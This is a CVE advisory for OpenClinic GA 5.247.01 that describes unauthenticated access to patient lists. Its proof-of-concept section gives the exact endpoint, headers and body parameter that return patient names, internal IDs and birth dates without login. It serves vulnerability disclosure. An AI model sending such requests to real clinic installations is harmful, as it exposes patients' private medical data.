# CVE-2023-40275: Unauthenticated Patient List Retrieval in OpenClinic GA 5.247.01
## Abstract
A security vulnerability has been identified in OpenClinic GA version 5.247.01, where unauthorized individuals can retrieve patient lists through specific POST requests to the patientslistShow.jsp component. This issue stems from inadequate access control mechanisms, exposing sensitive patient information to potential unauthorized access.

## Identification
CVE ID: CVE-2023-40275

Exploit Title: Unauthenticated Patient List Retrieval in OpenClinic GA 5.247.01

Date Discovered: 14-08-2023

Affected Software: OpenClinic GA version 5.247.01

Vendor: OpenClinic

Software Link: [SourceForge Project Page](https://sourceforge.net/projects/open-clinic/)

Tested Environments: Windows 10, Windows 11

## Vulnerability Details
This vulnerability allows unauthorized parties to access lists of patients by making specific POST requests to the patientslistShow.jsp page without requiring authentication. This flaw is attributed to improper access control within the application, jeopardizing the privacy and security of patient information.

## Proof of Concept (PoC)
  Steps to Reproduce:

    1. Preparing the POST Request:
      Use an HTTP client capable of sending POST requests (e.g., curl, Postman, or a custom script).
      Target URL: http://[IP]:10088/openclinic/_common/search/searchByAjax/patientslistShow.jsp, replacing [IP] with the actual IP address or domain of the OpenClinic GA installation.

    2. Crafting the Request Body:
      Include headers in the request as follows:
        Accept: text/javascript, text/html, application/xml, text/xml, /
        X-Prototype-Version: 1.7.3
        X-Requested-With: XMLHttpRequest
        User-Agent: [Your User Agent]
        Content-type: application/x-www-form-urlencoded; charset=UTF-8
        Origin: http://[IP]:10088
        Accept-Encoding: gzip, deflate
        Accept-Language: en-US,en;q=0.9
        Connection: close
        
      In the request body, include the parameter findFirstname=[any name].
    
    3. Sending the Request and Observing the Outcome:
      Upon sending the POST request, the server responds with a list of patients matching the findFirstname parameter, all without requiring authentication.

    4. Confirming the Vulnerability:
      This method exposes the internal ID and date of birth of patients, confirming an Incorrect Access Control vulnerability. The capacity to retrieve patient lists without authentication poses a significant risk, enabling unauthorized access to sensitive patient information.

## Impact
The exploitation of this vulnerability can lead to unauthorized access to sensitive patient information, including names, internal IDs, and dates of birth. This breach of privacy could have severe implications for affected individuals.
